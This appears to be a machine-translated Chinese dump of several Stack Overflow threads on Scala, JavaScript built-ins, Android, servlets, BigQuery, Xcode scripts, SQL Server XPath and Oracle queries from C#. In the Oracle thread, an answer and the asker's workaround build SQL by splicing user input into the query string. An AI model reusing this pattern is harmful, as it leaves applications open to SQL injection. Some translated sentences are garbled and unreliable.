> 赞同：3
> 
> 时间：2013-01-08T20:56:49.920

除了@Kim 的回答，应该注意的是该`mapValues`方法实际上并不*计算*中间结果：`mapValues`返回一个 Map 的*视图*。这使得它不同于大多数其他方法，包括`filterNot`甚至`map`.

一个例子：

```
val rest = stuff.mapValues {
  case quantity =>
    println("reading quantity " + quantity)
    quantity - used
}

rest("apple")
rest("apple") 
```

印刷：

```
reading quantity 5
reading quantity 5 
```

# javascript - 覆盖 JavaScript 对象和函数的危险

> ID：14220413
> 
> 赞同：6
> 
> 时间：2013-01-08T17:11:05.003
> 
> 标签：javascript, typescript, ecmascript-5

JavaScript 的本质允许完全重写其原生对象。我想知道这样做是否有任何真正的危险！

以下是本机 JavaScript 对象的一些示例

```
Object
Function
Number
String
Boolean
Math
RegExp
Array 
```

让我们假设我想对它们进行建模以遵循您可能在 Java（和其他一些 OOP 语言）中找到的类似模式，以便 Object 定义一组基本函数，并且每个其他对象都继承它（这必须明确由用户定义，与 Java 不同，Java 中的一切都自然地派生自对象）

**例子：**

```
Object = null;
function Object() {
   Object.prototype.equals = function(other) {
      return this === other;
   }

   Object.prototype.toString = function() {
      return "Object";
   }

   Object.equals = function(objA, objB) {
      return objA === objB;
   }
}

Boolean = null;
function Boolean() {
}
extend(Boolean, Object);  // Assume extend is an inheritance mechanism

Foo = null;
function Foo() {
   Foo.prototype.bar = function() {
      return "Foo.bar";
   }
}

extend(Foo, Object); 
```

在这种情况下，Object 和 Boolean 现在有了新的实现。在这方面，可能会发生什么？我可能会进一步破坏事情吗？

**编辑：**

我在某处读到 MooTools 和 Prototype 等框架有类似的方法，这是正确的吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-08T19:23:42.733

像这样的猴子修补内置类是一个有争议的话题。我个人不喜欢这样做有两个原因：

1.  内置类是一个全局范围。这意味着如果两个不同的模块尝试将具有相同名称的方法添加到全局类中，那么它们将发生冲突，从而导致细微的错误。更微妙的是，如果未来版本的浏览器决定实现一个同名的方法，你也会遇到麻烦。

2.  向公共类的原型添加东西可能会破坏使用 for-in 循环而不检查 hasOwnProperty 的代码（JS 新手经常对对象和数组这样做，因为 for-in 看起来像一个 foreach 循环）。如果您不能 100% 确定您使用的代码是否安全地使用了 for-in 循环，那么猴子修补 Object.prototype 可能会导致问题。

也就是说，在一种情况下，我发现monkeypatching builtins 是可以接受的，那就是在旧浏览器上添加新浏览器的功能（例如，数组的 forEach 方法）。在这种情况下，您可以避免与未来的浏览器版本发生冲突，并且不太可能让任何人感到意外。但即便如此，我仍然建议使用来自第三方的 shim，而不是自己编写代码，因为通常有很多棘手的极端情况很难解决。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-08T19:08:00.347

这里有一定程度的偏好，但我个人的看法是，这种事情有可能变成一个巨大的棘手的混乱。

例如，您从两个项目 A 和 B 开始，每个项目都决定在 String 上实现各种非常有用的流利方法。

项目 A 已决定`String`需要一个`isEmpty`函数，该函数`true`在字符串长度为零或仅为空格时返回。

项目 B 决定`String`需要一个在字符串长度为零时返回的函数，以及`isEmpty`在字符串长度为零或仅为空格时返回的函数。`true``isEmptyOrWhitespace``true`

现在您有一个项目想要使用项目 A 中的一些代码和项目 B 中的一些代码。它们都广泛使用了它们的自定义`isEmpty`函数。你有机会成功加入两者吗？可能不是。可以这么说，您处于集群安排中。

请注意，这与 C# 中的扩展方法非常不同，在 C# 中，您至少必须导入包含静态类的命名空间才能获取扩展方法，没有运行时冲突，并且可以合理地从同一项目中的 A 和 B 消费因为您没有导入他们的扩展名称空间（希望他们有远见将他们的扩展类放在一个单独的名称空间中，正是出于这个原因）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-08T17:31:41.857

我所知道的 JS 中最糟糕的情况是`undefined`. 你可以定义它。

您可以做类似`undefined = 'blah';`.... 之类的事情，此时您不能再依赖`if(x === undefined)`. 这很容易破坏您代码中其他地方的某些东西（或者，当然，在您可能正在使用的第三方库中）。

这完全是疯狂的，但绝对显示了任意覆盖内置对象的绝对危险。

另见：[http ://wtfjs.com/2010/02/15/undefined-is-mutable](http://wtfjs.com/2010/02/15/undefined-is-mutable)

举一个更合理的例子，以[Sahi 浏览器测试工具](http://sahi.co.in/)为例。此工具允许您为浏览器编写自动化脚本来测试您的站点。（类似于硒）。这样做的一个问题是，如果您的站点使用`alert()`or `confirm()`，则脚本将在等待用户输入时停止运行。Sahi 通过用自己的存根函数覆盖这些函数来解决这个问题。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-08T18:40:44.187

我避免覆盖固有对象的默认行为。它咬了我几次，而其他我很好。Sugar.js 是您可以查看示例的库。它是一些人喜欢的一个很棒的库，但我通常会避免它，因为它扩展了现有 JavScript 对象的行为，例如你正在做的事情。

但是我认为您会发现这纯粹是观点和风格。

# android - 如何将列表视图放在选项卡活动中？

> ID：14220419
> 
> 赞同：-1
> 
> 时间：2013-01-08T17:11:13.430
> 
> 标签：android, android-tabhost

我是Android编程的初学者。我正在尝试制作一个应用程序来显示具有不同价值的列表视图，这取决于我按下的选项卡。我遇到的问题是将 Listview 放在 tabhost 中并从代码中调用它。任何人都可以解释我该怎么做？我在网上搜索过，但这些例子并没有完全回答我。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:15:32.830

您不想将列表视图放在 tabHost 中。而不是这样做。

**主要活动**- 实现 tabHost 的地方。您可以在此处创建选项卡并将其链接到特定活动。

**FirstTabActivity** - 在此处使用您`ListView`的正常活动来实现您的代码。

**SecondTabActivity** - 在此处使用您`ListView`的正常活动来实现您的代码。

**ThirdTabActivity** - 在此处使用您`ListView`的正常活动来实现您的代码。

等等。

**编辑**

**教程**-[见这里](http://www.mkyong.com/android/android-tablayout-example/)。

# css - Ember.js 和 Three.js

> ID：14220422
> 
> 赞同：3
> 
> 时间：2013-01-08T17:11:28.460
> 
> 标签：css, ember.js, three.js

我一直在尝试将 Ember.js 与 Three.js 集成的方法。特别是，我想渲染一些元素，使用 Ember.js 绑定和一般的 pub/sub 处理来控制数据，但也不能使用 Three.js 使用 THREE.CSS3DObject 来操作视图/元素。

我对 Ember 相当有信心，但对 Three 来说是新手。我想我在想的是，我可以拥有一个同时存在于 THREE.Scene 和 Ember 应用程序命名空间中的元素吗？

在 THREE.js 元素周期表示例中：

[http://mrdoob.github.com/three.js/examples/css3d_periodictable.html](http://mrdoob.github.com/three.js/examples/css3d_periodictable.html)

创建一个 DOM.element，然后用属性（样式、位置等）进行装饰。

```
var element = document.createElement( 'div' );
    element.className = 'element';
    element.style.backgroundColor = 'rgba(0,127,127,'+(Math.random()* 0.5 + 0.25 ) + ')'; 
```

稍后，它作为一个元素添加到 THREE.CSS3Object 构造函数中：

```
var object = new THREE.CSS3DObject( element ); 
```

我想知道是否可以在 Ember containerView 中创建元素，然后使用 jQuery 迭代 childViews，将当前迭代的元素缓存为“元素”，然后将其呈现给 THREE.CSS3DObject 构造函数？

我知道这有点 hacky，我只提到上面的一些迹象表明我在寻求帮助之前已经尝试过想办法！哈哈！

任何像我这样的指导，甚至是天上掉馅饼的建议都将不胜感激。提前致谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-09T06:55:52.960

Three 的 CSS3D 渲染器只是浏览器自身渲染器的一个精简抽象，因此不应与使用 Ember 或 jQ 操作 DOM 元素发生冲突。

Once passed to the CSS3DObject constructor, an element's 3D transforms are updated but beyond that, it's business as usual. You can manipulate its content and style it as needed.

# java - 在会话外保存对象值的方法

> ID：14220423
> 
> 赞同：0
> 
> 时间：2013-01-08T17:11:30.600
> 
> 标签：java, servlets, persistence, persistent-storage

这里的目标是拥有一个带有按钮的 servlet，当单击时会`Date()`在会话内存之外创建一个持久对象，即可以在关闭浏览器并访问页面后检索变量值。
想知道这里最好的方法是什么？
我考虑过数据库或写入文件。

希望在屏幕上有一个标签和按钮，当单击按钮时，它会在服务器上创建一个时间戳，标签包含自单击按钮以来的“经过的时间”。
本质上是一个持续时间，但相同的值对所有用户/会话都是可见的。
一旦`#timeStarted`被请求加载，就会有一些javascript来更新持续时间`setInterval()`，这部分没有问题。

```
"<label id=\"timeStarted\"> + getTimeStarted() + "</label>"

<form method="post" action="SomeServlet">  
    <input type="submit" value="Go"/>  
</form> 
```

在`SomeServlet`声明变量/持久对象时：

```
Date timeStarted = new Date(); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T17:14:25.950

您可以使用 getServletContext() 方法将其存储在 ApplicationContext 级别并将其存储在那里。这将使时间保持在应用程序级别。

**但请记住**，如果您在具有负载平衡器的多台服务器上运行应用程序，您可能无法实现这一点。然后你必须寻找基于数据库的解决方案。否则，您可以将其存储在应用程序上下文中并为所有用户检索。

在您的 doGet / doPost 方法中，

```
ServletContext context = request.getServletContext();
context.setAttribute("clicktime", new Timestamp(System.currentTimeMillis())); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-18T12:45:05.847

决定在这里使用一些 AJAX，
一旦单击按钮，它就会触发`xmlhttprequest`一个 servlet。
servlet 然后创建一个存储`Date()`对象值的文件，即 long

当页面加载时，它`Date`从文件中检索值并显示在屏幕上.. 从而持久存储。

# google-bigquery - bigquery 中允许的表数量是否有限制

> ID：14220428
> 
> 赞同：8
> 
> 时间：2013-01-08T17:11:56.540
> 
> 标签：google-bigquery

我在 BigQuery 中可以拥有的表数量是否有限制？我正在尝试创建多个小表以降低查询成本。谢谢！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2015-11-07T11:56:04.830

现在是：

```
Maximum number of tables referenced per query — 1,000
Maximum unresolved legacy SQL query length — 256 KB
Maximum unresolved standard SQL query length — 1 MB
Maximum resolved legacy and standard SQL query length — 12 MB 
```

[https://cloud.google.com/bigquery/quotas](https://cloud.google.com/bigquery/quotas)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-01-09T07:54:17.333

桌子的数量没有限制。由于查询字符串的长度有 10k 的限制，您可能无法全部查询它们。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-01-08T19:19:21.480

您可以创建的表格数量没有限制。如果您有超过几千个表，列出数据集可能会很慢（并且打开 UI 可能会很慢），否则您可以根据需要创建任意数量的表。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-06-25T02:35:38.017

你可以看到这个[文件](https://cloud.google.com/bigquery/quotas#table_limits)。标准表没有最大数量。但分区表有限制。(4,000) 如果有这么多的表，api 可能会很慢并且在控制台上查看表有限制。当您使用 API 调用时，当您接近数据集中的 50,000 个表时，枚举性能会降低。Cloud Console 最多可为每个数据集显示 50,000 个表。

# php - 选择日期后 JS 验证报告为空

> ID：14220429
> 
> 赞同：1
> 
> 时间：2013-01-08T17:12:03.950
> 
> 标签：php, jquery, validation, datepicker

我的代码中有一个小错误。当用户选择日期字段时，会弹出一个日历并且可以单击一个日期，但验证会给出一个错误，好像是空的。

如果用户再次单击错误消失或如果他们单击提交，则表单将正常运行，即使仍然显示错误文本。

想清理这个松散的结尾，但其中一些代码不是我自己的，所以无法找到问题所在。

表单字段和验证功能在下面，工作副本在 jsfiddle 上。

表格代码是

```
<label class="control-label" for="date">Date:</label>
<input type="text" name="date" id="date" readonly onClick="GetDate(this);"/>
<button type="submit" class="btn btn-giant btn-primary">Submit</button> 
```

验证声明是

```
jQuery(function () {
jQuery("#date").validate({
expression: "if (VAL) return true; else return false;",
message: "Please select a date."
});
}); 
```

我已经在 jsfiddle 上发布了一个工作示例。

[http://jsfiddle.net/andrewgledhill/NdHGH/1/embedded/result/](http://jsfiddle.net/andrewgledhill/NdHGH/1/embedded/result/)

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-09T23:32:13.940

您需要在输入更改后进行验证。您在文本到达输入之前进行验证。你可以看到这个小提琴没有给出错误：http: [//jsfiddle.net/NdHGH/4/](http://jsfiddle.net/NdHGH/4/)

我还将您的 onclick 从内联 onclick 移开，以使其更易于理解：

```
jQuery(function () {
  jQuery('#date').on('click',function(){
    GetDate(this);
  });
  jQuery("#date").on('change',function(){
    validate({
      expression: "if (VAL) return true; else return false;",
      message: "Please select a date."
    });
  });
}); 
```

# android - Android ViewPager 自动聚焦 WebView

> ID：14220430
> 
> 赞同：4
> 
> 时间：2013-01-08T17:12:07.913
> 
> 标签：android, android-webview, android-viewpager

我有一个来自支持库的带有 ViewPager 的 android 应用程序。在片段的视图中，我在顶部有一些视图，在它们下面有一些 HTML 内容的 WebView。

第一页已正确加载，但在页面之间切换时，每个下一页都会自动向下滚动到 web 视图并聚焦其中的某些内容（图像、超链接），用默认样式（我手机上的橙色）标记它。这非常奇怪，我不知道它来自哪里，我想摆脱这种行为。打开时，每个页面都应位于其顶部（滚动位置 0）。加载视图 (onCreateView) 后会发生短暂的延迟，因此在 onCreateView 中将滚动位置设置为 0 并没有帮助。

滑动到另一个页面后，它应该是这样的：

[好版本 http://imageshack.us/a/img254/4623/shotgood.png](http://imageshack.us/a/img254/4623/shotgood.png)

但大约之后。一秒钟，它会自动向下滚动，聚焦一个链接，看起来像这样：

[坏版本 http://imageshack.us/a/img855/1848/shotbad.png](http://imageshack.us/a/img855/1848/shotbad.png)

有人遇到过这样的问题并知道解决方案吗？

提前致谢。

编辑：我注意到当我不在任何片段内垂直滚动时，不会发生此问题。在我垂直滚动然后滑动到另一页后，它开始在每一页上发生。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-01-09T13:18:37.183

经过几天的搜索，我终于找到了这里描述的解决方案：

[android中视图寻呼机内的Webview](https://stackoverflow.com/questions/11009333/webview-inside-a-view-pager-in-android)

重点是添加

```
android:descendantFocusability="blocksDescendants". 
```

到最外层的线性布局。

# ios - xcode 在部署时运行脚本

> ID：14220438
> 
> 赞同：0
> 
> 时间：2013-01-08T17:12:36.107
> 
> 标签：ios, cocos2d-iphone, xcode4.5

我有一个游戏，里面有 xml 文件。我的游戏可以在 iPad 和 iPhone 上运行，我需要相应地对这些 xml 文件进行一些更改，但是 xml 文件是原始文件，我不希望它们更改，所以我想要的是在编译时自动更改我的 xml 文件. 为此，我有一个 ruby​​ 脚本可以满足我的需要。假设这个脚本是 level_converter.rb 我可以执行（在终端）如下：

```
for f in Resources/*.xml; do ruby level_converter.rb "$f"; done 
```

所以我将此代码添加到 Build Phases 以这种方式运行脚本，这确实按预期工作，它确实正确更改了所有 xml 文件，但它当然会更改资源文件夹中的原始 xml 文件。所以说如果我运行两次 - 我将这些文件更改两次。我想要的是这些文件保持不变，但只有那些部署的文件应该改变。所以我需要某种 $(PROJECT_DISTRIBUTION_AND_DEVELOPEMENT_TEMP_FOLDER) 或类似的东西，而不是简单的 Resorces/*.xml 例如。

```
for f in $(PROJ_DISTRIB_AND_DEV_TMP_FLDE)/*.xml; do ruby level_converter.rb "$f"; done 
```

编辑：我的问题一定不是很清楚，所以我改写了

问候，伊戈尔

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-09T10:09:43.447

我能够实现我想要的，这是脚本：

```
PROJ_DIR=${PWD}

echo "Converting xml files..."
for f in "${CODESIGNING_FOLDER_PATH}/"*.xml
do
    cp $PROJ_DIR/Resources/"${f##*/}" "$f"
    ruby level_converter.rb "$f" $PROJ_DIR/key_hash;
done

exit 0; 
```

所以我使用了这个 ${CODESIGNING_FOLDER_PATH} 变量。

解释：

*   for 迭代目标目录中的 *.xml 文件
*   cp $PROJ_DIR/Resources/"${f##*/}" "$f": 至于 xcode 仅在资源被更改时才复制资源，我必须手动复制 xml 文件以防止它们被转换一次以上 - 所以转换器在每个构建中执行，因此它应该有原始文件可以转换
*   ruby level_converter.rb "$f" $PROJ_DIR/key_hash; ：这只是执行脚本

这做了我不想要的，但有缺点/疑问：

*   我不时收到警告，指出已签名的资源已更改或删除（不过这并不让我感到惊讶）。也许有办法抑制这种情况？它确实阻止了应用程序被沙盒化，我必须重新构建，希望下次不会有警告。幸运的是它不经常出现
*   构建需要更长的时间，如果原始文件发生更改并且仅在必要时执行脚本仍然会很好
*   我仍然认为应该有一些“正确”的方式来实现我想要的
*   我不确定我是否正确选择了变量 CODESIGNING_FOLDER_PATH，也许我应该使用另一个

编辑：我在编译源代码之前将运行脚本移动到运行，并且从那时起没有收到任何关于签名资源更改的警告。徘徊如果这是原因

# javascript - jquery检测小键盘按键值

> ID：14220439
> 
> 赞同：4
> 
> 时间：2013-01-08T17:12:43.390
> 
> 标签：javascript, jquery, keydown, keyup

> **可能重复：**
> [为键盘（小键盘）键获取正确的 keyCode](https://stackoverflow.com/questions/5630918/get-correct-keycode-for-keypadnumpad-keys)

我正在编写一个需要能够获取键盘上按下的数字值的应用程序。我想出了以下代码：

```
 var keyVal = "";
    $(document).on("keydown.xRuleKey", function(e) {
        var keyChar = String.fromCharCode(e.which);
        if (!isNaN(keyChar)) {
            keyVal += keyChar;
        }
    }) 
```

这适用于键盘顶部的数字，但是当我使用小键盘时，返回字符“`abcdefghi”而不是“0123456789”。这是正常的还是我的键盘很奇怪？如果这是正常的，那么简单地设置一个键/值对来将字母转换为它的数字等价物是安全的，否则会与其他任何东西发生冲突。我认为它不会与常规字母键冲突，因为它们返回大写字符而小键盘返回小写。

有什么想法吗？以前有人处理过这个吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-08T17:55:21.170

从评论.. :-)

看看这里：[stackoverflow.com/questions/5630918/](https://stackoverflow.com/questions/5630918/) ...，有一个很棒的 jsfiddle 的链接：jsfiddle.net/AEMLoviji/tABDr

希望一切顺利.. :-)

# sql-server - SQL Server 查询 XML xpath 空命名空间

> ID：14220441
> 
> 赞同：1
> 
> 时间：2013-01-08T17:12:47.773
> 
> 标签：sql-server, xml, xpath, sql-server-2008-r2

在对具有空命名空间的节点的 XML 字段执行 Xpath 查询时，我在 SQL Server 2008 R2 上遇到了一个奇怪的行为。

此查询不返回结果：

```
[xml_field].query('/RootNode/NodeWithEmptyNamespace') 
```

此查询返回结果：

```
[xml_field].query('/dft:RootNode/NodeWithEmptyNamespace') 
```

为澄清起见，此查询还返回结果，因此根节点（可能还有默认命名空间）不需要前缀：

```
[xml_field].query('/RootNode') 
```

根据定义空命名空间时的[XML 命名空间默认文档，命名空间为无。](http://www.w3.org/TR/xml-names/#defaulting)

数据库中的 XML 如下：

```
<RootNode xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns="http://tempuri.org">
  <otherNode>Dummy data</otherNode>
  <NodeWithEmptyNamespace xmlns="">Other dummy data</NodeWithEmptyNamespace>
</RootNode> 
```

完整的查询：

```
WITH XMLNAMESPACES ('http://tempuri.org' as dft)
SELECT TOP 150 [ID],
       [xml_field].query('/dft:RootNode/NodeWithEmptyNamespace')
  FROM [database]; 
```

有人对此行为有解释还是这是一个错误？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-08T17:26:35.217

目前尚不清楚您的问题是什么。使用 XML 示例，您已经发布了`RootNode`元素，并且`otherNode`元素在命名空间中`http://tempuri.org`，而`NodeWithEmptyNamespace`元素不在命名空间中（就像`xmlns=""`放在那里的那样）。使用 XPath，路径或步骤在无命名空间中选择该名称的元素，`NodeWithEmptyNamespace`并且`RootNode`也会在无命名空间中选择该名称的元素**，**只有在您的输入中没有这样的元素。因此，您的路径`/dft:RootNode/NodeWithEmptyNamespace`正在做正确的事情，它选择名称`RootNode`空间中与`dft`前缀 (ie `http://tempuri.org`) 绑定的具有本地名称的元素及其`NodeWithEmptyNamespace`在无名称空间中具有本地名称的子元素。

# android - Android FileLock ...如何锁定来自不同进程的文件

> ID：14220442
> 
> 赞同：2
> 
> 时间：2013-01-08T17:12:48.177
> 
> 标签：android, file, locking

我需要锁定一个从三个不同的 android 应用程序读取和写入的文本文件......所以不同的进程。

我尝试在写入时使用通道 lock() （独占模式），在读取文件时尝试使用 lock(0L, Long.MAX_VALUE, true) （共享）。

不幸的是，这种方法不起作用......在读取时总是获取锁，当写入锁尚未释放时也是如此。

是否有合适且可行的示例来解决此问题？难道我做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-09T11:21:02.870

终于我解决了！FileLocks 没问题...我的问题是我正在使用 storeToXml 写入一个 xml 文件，该文件可能会创建一个全新的文件...因此创建了新的文件描述符并且锁定属性可能丢失了。现在我锁定了另一个虚拟文件，而不是我正在读写的文件，一切都按预期工作。

# share - ASP.NET Web 窗体中两个页面之间共享的代码应该放在哪里？

> ID：14220444
> 
> 赞同：3
> 
> 时间：2013-01-08T17:12:52.630
> 
> 标签：share, webforms, code-behind

我有一个 ASP.NET Web 窗体应用程序。

在这个应用程序中，我有一个`Login.aspx`包含代码的页面。现在我想创建页面`LoginLight.aspx`的轻量级版本`Login.aspx`。精简版应该有较少的 HTML 内容，并且应该使用`Login.aspx.vb`后面代码的关键功能。这些函数有很多代码。

因此，为了不出现大量重复代码，我想将常用函数移到一个常用文件中。我正在考虑将这些函数放在文件夹中的类库中，`App_Code`但我在网上看到这不是一个好的解决方案。

我还读到`code behind`对于两个不同的页面具有相同的内容，因为这不是一个好习惯。我将如何解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-09T17:31:31.130

创建一个包含您想要共享的所有功能的基本页面。

`Login.aspx`并且`LoginLight.aspx`都将继承该基本页面。

# xml - 自动将 XML 导入 Wordpress

> ID：14220446
> 
> 赞同：0
> 
> 时间：2013-01-08T17:13:02.170
> 
> 标签：xml, wordpress

我有一个生成有效 XML Wordpress RSS 文件的 PHP 脚本。文件结构是 WP 有效的，即我可以使用该文件将数据导入 WP（工具 -> 导入 -> Wordpress），一切都像魅力一样。

我想知道是否有一种方法可以自动执行此操作，即我不必以管理员身份登录，转到仪表板 -> 工具 -> 手动导入和导入 .xml 文件，而是编写某种脚本在我的 PHP 脚本生成 .xml 文件后自动执行此操作。

我读过一些关于 WP XMLRPC 的东西，但我不确定这是否是正确的方法。如果是这样，如果有人可以帮助我解决这个问题，我将不胜感激。

谢谢！

# ios - Core Data iOS 中的 SIGTRAP

> ID：14220447
> 
> 赞同：0
> 
> 时间：2013-01-08T17:13:05.793
> 
> 标签：ios, xcode, core-data, nsfetchedresultscontroller

我有这个函数在两个地方返回一个 SIGTRAP。

```
- (void)addShindy:(UIBarButtonItem *)sender
{
    AddShindyViewController *addShindyViewController = [[AddShindyViewController alloc] initWithNibName:@"AddShindyViewController" bundle:nil];
    UINavigationController *navController = [[UINavigationController alloc] initWithRootViewController:addShindyViewController];

    addShindyViewController.delegate = self;

    NSManagedObjectContext *addingContext = [[NSManagedObjectContext alloc] initWithConcurrencyType:NSMainQueueConcurrencyType];
    [addingContext setParentContext:[self.fetchedResultsController managedObjectContext]];
    // SIGTRAP occurring on line above this

    Shindy *shindy = (Shindy *)[NSEntityDescription insertNewObjectForEntityForName:@"Shindy" inManagedObjectContext:addingContext];
    addShindyViewController.shindy = shindy;
    addShindyViewController.managedObjectContext = addingContext;

    [self presentViewController:navController animated:YES completion:nil];
} 
```

我怀疑该错误与“添加上下文”有关，因为引发错误的两行都有共同点。

如果有人需要，我可以发布更多代码。

# c# - SQL 适用于 Oracle SQL Developer，但不适用于 C# 代码

> ID：14220455
> 
> 赞同：0
> 
> 时间：2013-01-08T17:13:23.760
> 
> 标签：c#, sql, oracle

如果我只是在 Oracle SQL Developer 上执行，我有这个 SQL 可以工作：

```
SELECT * FROM MYTABLE 
WHERE LOWER(TRANSLATE(DESCRIPTION, 'âáàãêéèîíìôóòõûúùç', 'aaaaeeeiiioooouuuc')) 
LIKE LOWER(TRANSLATE('%são paulo%', 'âáàãêéèîíìôóòõûúùç', 'aaaaeeeiiioooouuuc')) 
```

但是当在 C# 代码上执行时，将不起作用。结果始终为 0。

```
string translate = "'âáàãêéèîíìôóòõûúùç', 'aaaaeeeiiioooouuuc'";
string query = string.Format("SELECT * FROM {0} 
                             WHERE LOWER(TRANSLATE(DESCSITE, {2})) 
                             LIKE LOWER(TRANSLATE({1}, {2}))", 
                             TABLE, string.Format("'%{0}%'", str.ToLower()), translate); 
```

更新

这是在断点中显示的方式：

```
SELECT * FROM PROD 
WHERE TRANSLATE(LOWER(DESCSITE), 'âáàãêéèîíìôóòõûúùç', 'aaaaeeeiiioooouuuc') 
LIKE TRANSLATE(LOWER('%macarrão%'), 'âáàãêéèîíìôóòõûúùç', 'aaaaeeeiiioooouuuc') 
```

和同样的问题。适用于 Oracle SQL Developer 但不适用于 C# 代码。

更新

我试过这个，但在这种情况下不起作用。

```
string query = string.Format("SELECT * FROM {0} 
                 WHERE LOWER(TRANSLATE(DESCSITE, {1})) 
                 LIKE LOWER(TRANSLATE(:DESCSITE, {1}))", TABLE, translate);
List<OracleParameter> parameters = new List<OracleParameter>();
parameters.Add(new OracleParameter(":DESCSITE", string.Format("'%{0}%'", str))); 
```

如果我只尝试这个，我知道它会起作用，但我必须检查其他的东西。

```
string query = string.Format(@"SELECT * FROM {0} WHERE CODIPROD = :CODIPROD", TABLE);
List<OracleParameter> parameters = new List<OracleParameter>();
parameters.Add(new OracleParameter(":CODIPROD", id)); 
```

更新

我正在使用retun：

**OracleCommand 命令；command.ExecuteReader();**

更新

我尝试将**Unicode=True**放在 ConnectionString 上，但没有

更新

这就是我执行查询的方式。没有重音的字符一切正常：

```
OracleConnection connection = new OracleConnection();
connection.Open();

OracleTransaction transaction;
transaction = connection.BeginTransaction();

OracleCommand command;
command = connection.CreateCommand();
command.Transaction = transaction;
command.CommandText = commandText;

OracleParameter parameter;
command.Parameters.Add(parameter);

reader = command.ExecuteReader();

while (reader.Read())
{
    // Get data
} 
```

所以，最后一次尝试（昨天下午 5 点）我做了这个：

```
String x = "SELECT * FROM PROD WHERE TRANSLATE(LOWER(DESCSITE), 'âáàãêéèîíìôóòõûúùç', 'aaaaeeeiiioooouuuc') LIKE LOWER(TRANSLATE('%"+str+"%', 'âáàãêéèîíìôóòõûúùç', 'aaaaeeeiiioooouuuc'))"; 
```

并且工作正常。但是这种方式我知道是不对的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T17:46:42.583

您以错误的顺序调用函数。TRANSLATE 函数区分大小写。因此，您必须在翻译**之前**使字符串小写。

```
SELECT * FROM {0}
WHERE TRANSLATE(LOWER(DESCSITE), {2}) LIKE TRANSLATE({1}, {2}) 
```

此外，第二个`LOWER`是多余的，因为你`str.ToLower()`已经这样做了。

* * *

**更新**

目前尚不清楚您如何真正执行查询。这是如何完成的示例

```
string connectionString = "...";
string query = "...";
using (var connection = new OracleConnection(connectionString)) {
    var command = new OracleCommand(query);
    command.Parameters.Add(":DESCSITE", OracleType.NVarChar);
    connection.Open();
    using (OracleDataReader reader = command.ExecuteReader()) {
        int descSiteOrdinal = reader.GetOrdinal("DESCSITE");
        while (reader.Read()) {
            Console.WriteLine(reader.GetString(descSiteOrdinal));
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2014-10-20T14:29:47.887

我已经解决了它在我的connectionString中添加这个（Unicode = true;）：

```
 protected string conexionOraclePruebas = @"Data Source=(DESCRIPTION=(ADDRESS_LIST=(ADDRESS=(PROTOCOL=xxx)(HOST=xxx)(PORT=xxx)))(CONNECT_DATA=(SERVER=xxx)(SERVICE_NAME=xxx)));"
+ " User Id=xxx;Password=xxx;Min Pool Size=x;Connection Lifetime=x; "
+ " Unicode=true;"; 
```

我的查询是：

```
query += " AND translate(UPPER(" + field + "), 'ÁÉÍÓÚÀÈÌÒÙÃÊÎÕÛÂÄËÏÖÔÜÇÑ', 'AEIOUAEIOUAEIOUAAEIOOUCN') "
+"LIKE translate(UPPER('%" + this.value.ToString() + "%'), 'ÁÉÍÓÚÀÈÌÒÙÃÊÎÕÛÂÄËÏÖÔÜÇÑ', 'AEIOUAEIOUAEIOUAAEIOOUCN')"; 
```

# sqlite - 可以在 MySql 和 Sqlite 中使用多个数据库的公共实体使用 Symfony2、Doctrine2 吗？

> ID：14220458
> 
> 赞同：1
> 
> 时间：2013-01-08T17:13:33.653
> 
> 标签：sqlite, symfony, doctrine-orm, entities

我正在寻找一种将单个 EntityManager 与多个数据库一起用于 MySql 和 sqlite 连接的方法。Mysql 用于生产，而我们想使用 Sqlite 进行测试。

它适用于mysql。我没有在 config.yml 的默认连接中指定 dbname，然后在实体注释中引用表名，例如`@ORM\Table(name="Orders.tblAccount")`. 我们这样做是因为我们有跨数据库关系。

但是当更改驱动程序并将其用于 Sqlite 时，我无法为此连接删除/创建数据库，因为没有数据库名称，但我不需要指定 EntityManager 名称即可使用来自不同数据库的实体。

**示例：用于 mysql 连接的 config.yml**

```
doctrine:
    dbal:
        default_connection: Default
        connections:
            Default:
                driver:   %database_driver%
                host:     %database_host%
                user:     %database_user%
                password: %database_password%
                charset:  %database_charset%
    orm:
        default_entity_manager: Default
        entity_managers:
            Default:
                connection: Default
                mappings:
                    AcmeOrdersBundle: ~
                    AcmeStoreBundle: ~ 
```

**示例：实体的注释**

```
/**
 * Acme\OrdersBundle\Entity\Account
 *
 * @ORM\Table(name="Orders.tblAccount")
 * @ORM\Entity(repositoryClass="Acme\OrdersBundle\Repository\AccountRepository")
 * @ORM\HasLifecycleCallbacks
 */
class Account

/**
 * Acme\OrdersBundle\Entity\AccountType
 *
 * @ORM\Table(name="Orders.ublAccountType")
 * @ORM\Entity(repositoryClass="Acme\CoreBundle\Repository\DoctrineRepository")
 */
class AccountType extends BaseEntity

/**
 * Acme\StoreBundle\Entity\Employee
 *
 * @ORM\Table(name="Store.tblEmployee")
 * @ORM\Entity(repositoryClass="Acme\StoreBundle\Repository\EmployeeRepository")
 */
class Employee 
```

**示例：用于 sqlite 连接的当前 config.yml**

```
SQLite connection #config.yml

doctrine:
    dbal:
        default_connection:    Default
        connections:
